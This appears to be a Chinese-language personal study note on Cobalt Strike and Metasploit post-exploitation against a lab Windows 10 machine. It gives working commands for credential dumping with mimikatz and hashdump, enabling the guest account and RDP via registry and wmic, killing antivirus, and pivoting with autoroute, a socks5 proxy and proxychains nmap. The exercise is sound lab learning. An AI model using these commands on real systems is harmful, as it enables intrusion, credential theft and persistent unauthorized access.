### 20201118笔记



---





>  假定情况，已经获取到window的管理员shell，
>
>  靶机：win10



#### 0x00 cs入门操作

 + 网络信息

   + ifconfig

   <img src="images/image-20201118105434263.png" alt="image-20201118105434263" style="zoom:50%;" />

   ​		只有一个网段，使用下面命令查看其他主机信息

   ​		`arp -a `

   ​		`for /l  %i  in (1,1,255) do @  ping  10.211.55.%i  -w  1  -n  1 |  find  /i  "ttl="`

   

   

   + Arp -a

   <img src="images/image-20201118105340203.png" alt="image-20201118105340203" style="zoom:50%;" />

   ​		可用快速查看到同网段的部分设备

   

   

   

   + ping命令ping同网段主机

   <img src="images/image-20201118105753199.png" alt="image-20201118105753199" style="zoom:50%;" />

   ​		等待一段时间就会有回复

   

   

   

   + Netstat 查看开放的端口等信息

   <img src="images/image-20201118110349143.png" alt="image-20201118110349143" style="zoom:50%;" />

   ​		看到常用的445，3306等

   

   

   

   + portscan + ip

     `portscan 192.168.96.130`

     通过cs自带的扫描器扫描内外常用的端口（不全面）

   <img src="images/image-20201118111403721.png" alt="image-20201118111403721" style="zoom:50%;" />

   

   





 + 进程列表

   	+ Tasklist 

   <img src="images/image-20201118111709534.png" alt="image-20201118111709534" style="zoom:50%;" />

   在tasklist中可用获取到很多的进程信息，后台的服务信息，然后可以尝试相应服务的一些漏洞

   

   

 + 服务列表

   + `wmic service`

   <img src="images/image-20201118111042216.png" alt="image-20201118111042216" style="zoom:50%;" />

   

   






 + 本地用户分析

   + whoami

     <img src="images/image-20201118113420359.png" alt="image-20201118113420359" style="zoom:50%;" />

   + net user

     <img src="images/image-20201118113444414.png" alt="image-20201118113444414" style="zoom:50%;" />

     

   + cs中  run mimikatz 获取账户信息

     NTLM为加密的账户密码，拿到解密网站上进行解密，运气好就可以直接解密出明文密码

     ​	<img src="images/image-20201118153938778.png" alt="image-20201118153938778" style="zoom:50%;" />

   

   

   + 下载文件

     文件下载完成后回存放在cs文件夹下的download文件夹下并且重命名过

     `download filePaht/fileName`

   

   

   

+ 隐藏痕迹

  + 启用guest账户

    `net user guest /active:yes`

    <img src="images/image-20201118144214450.png" alt="image-20201118144214450" style="zoom:50%;" />

  

  + 开启远程端口

    `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /t REG_DWORD /v portnumber /d 3389 /f`

    <img src="images/image-20201118144758798.png" alt="image-20201118144758798" style="zoom:50%;" />

  

  

  + 开启远程桌面

    `wmic RDTOGGLE WHERE ServerName='00h31a7k2030c25' call SetAllowTSConnections 1`

    <img src="images/image-20201118150459154.png" alt="image-20201118150459154" style="zoom:50%;" />

    

    

    >  00h31a7k2030c25是计算机的名字，可以通过查whoami找到

    <img src="images/image-20201118150350690.png" alt="image-20201118150350690" style="zoom:50%;" />

  

  ​		执行完成之后就可以看到3389端口已经开启了

  ​		<img src="images/image-20201118150631579.png" alt="image-20201118150631579" style="zoom:50%;" />

  

  

  

  + 命令授权用户进行远程登陆

    **暂未找到命令 **

  

  

  + 多用户登陆设置

    需要远程登陆管理员设置

  



#### 坑点汇总

1. win远程连接出现函数不支持，按照教程找到凭证配置中没有相应加密oracle的选项，没有加密修正
2. 最新的win10专业版执行powershell不是以管理员用户执行，需要提权
3. 按照教程新建隐藏用户失败
4. 新建默认账户禁止远程登陆，可能需要添加到管理员组





> ​	在边学边操作的过程中，在网上没找到通过命令行直接授权让用户进行远程登陆的方法，于是想新建一个所谓隐藏账户，但是在这个win10的机器上加$符号并不会隐藏账户，所以干脆直接新建用户然后加入到管理组，这样就可以进行远程。
>
> ​	上面的大部分操作都忘了记录下来就直接跳过，开始下一步的记录了
>
> 











---

#### 0x01 cs入门到放弃  :-)



>  在vm中起了一个靶场dc-6
>
>  使用占据好的据点进行下一步
>
>  
>
> 受害机 win10 192.168.96.142



```html
1、Foreign Beacon与CS跟MSF之间的会话派发
```





+ 将cs会话派生到msf中

  `cs和msf中的功能都挺多，然鹅并不是很熟悉，好像msf中的工具很多就想着cs转发到msf中，使用msf继续`

  1. 在cs监听器中添加一个foreign的http

     ​		<img src="images/image-20201119150823634.png" alt="image-20201119150823634" style="zoom:50%;" />

     

  2. msf中开启监听

     ```shell
     use exploit/multi/handler
     set payload windows/meterpreter/reverse_http
     set lhost 192.168.xx.xx   #本机ip
     set lport xxx #本机端口
     ```

     

  3. 在cs的beacon中右键添加会话或者spawn，选择刚刚建立的reverse_http

     <img src="images/image-20201119151901327.png" alt="image-20201119151901327" style="zoom:50%;" />

  





+  使用msf进行

  > msf会话就类似linux的操作就比较舒服



​		**部分命令**

```shell
		sysinfo																					#系统信息
		run post/windows/gather/checkvm									#检查是否虚拟机
		run post/windows/manage/killav									#关闭杀软
		run post/windows/manage/enable_rdp							#开3389
		run post/windows/gather/enum_logged_on_users    #列举当前目标机有多少用户登录
		run hashdump																		#获取账户密码   --> 本地环境试验失败
		
```




+ msf添加路由，使用代理扫描内网主机

  1.添加路由

  `在添加前先要看一下内网网段，将目标网段添加到路由中`

  <img src="images/image-20201119165948368.png" alt="image-20201119165948368" style="zoom:50%;" />





​		2.添加目标网段进路由中,同时查看是否成功

```shell
run autoroute -s 192.168.96.0 -n 255.255.255.0
run autoroute -p
```

<img src="images/image-20201119170151816.png" alt="image-20201119170151816" style="zoom:50%;" />





​		3.路由绑定后，使用msf的代理模块socks4或者socks5都可以，这里我使用socks5（因为socks4不行😕）。开启后可以查看一下端口是否正常开启代理



```shell
meterpreter > background  #meterpreter放后台
[*] Backgrounding session 1...   #恢复使用 sessions 1

msf5 exploit(multi/handler) > use auxiliary/server/socks5 

msf5 auxiliary(server/socks5) > set srvhost 192.168.96.130
srvhost => 192.168.96.130

msf5 auxiliary(server/socks5) > run
[*] Auxiliary module running as background job 0.

#查看是否启动
msf5 auxiliary(server/socks5) > netstat -antp | grep 1080
[*] exec: netstat -antp | grep 1080

tcp        0      0 127.0.0.1:1080          0.0.0.0:*               LISTEN      22886/ruby          
```



​		4.用proxychain代理nmap扫描流量到socks5中，启动前先配置一下proxychain,在末尾直接添加配置项就ok

```shell
vim /etc/proxychain.conf
```

<img src="images/image-20201119171359402.png" alt="image-20201119171359402" style="zoom:50%;" />



​		5.使用nmap进行内网扫描

​			~~啪的一下就扫描出来了,很快啊~~

```shell
root@kali:~# proxychains nmap 192.168.96.0/24
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-19 03:56 EST
Stats: 0:00:12 elapsed; 250 hosts completed (5 up), 5 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 100.00% done; ETC: 03:56 (0:00:00 remaining)
Nmap scan report for 192.168.96.1
Host is up (0.000099s latency).
Not shown: 992 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
135/tcp  open  msrpc
443/tcp  open  https
902/tcp  open  iss-realsecure
912/tcp  open  apex-mesh
3389/tcp open  ms-wbt-server
4444/tcp open  krb524
5357/tcp open  wsdapi
MAC Address: 00:50:56:C0:00:08 (VMware)

Nmap scan report for 192.168.96.2
Host is up (0.00014s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
53/tcp open  domain
MAC Address: 00:50:56:E3:0F:E7 (VMware)

Nmap scan report for 192.168.96.142
Host is up (0.00034s latency).
Not shown: 991 closed ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
1080/tcp open  socks
1081/tcp open  pvuniwien
3389/tcp open  ms-wbt-server
7001/tcp open  afs3-callback
7201/tcp open  dlip
MAC Address: 00:0C:29:C0:C5:56 (VMware)

Nmap scan report for 192.168.96.144
Host is up (0.00017s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:4A:87:0A (VMware)

Nmap scan report for 192.168.96.254
Host is up (0.00047s latency).
All 1000 scanned ports on 192.168.96.254 are filtered
MAC Address: 00:50:56:F1:2C:B4 (VMware)

Nmap scan report for 192.168.96.130
Host is up (0.0000060s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
4444/tcp open  krb524
8888/tcp open  sun-answerbook

Nmap done: 256 IP addresses (6 hosts up) scanned in 13.20 seconds
```



扫描结果中144的机器就是我的靶机

<img src="images/image-20201119171918507.png" alt="image-20201119171918507" style="zoom:50%;" />





---

未完。。

接下去的折腾目标

使用portfwd转发，代理什么的让144机器的80端口通过window映射出外部







---

201123











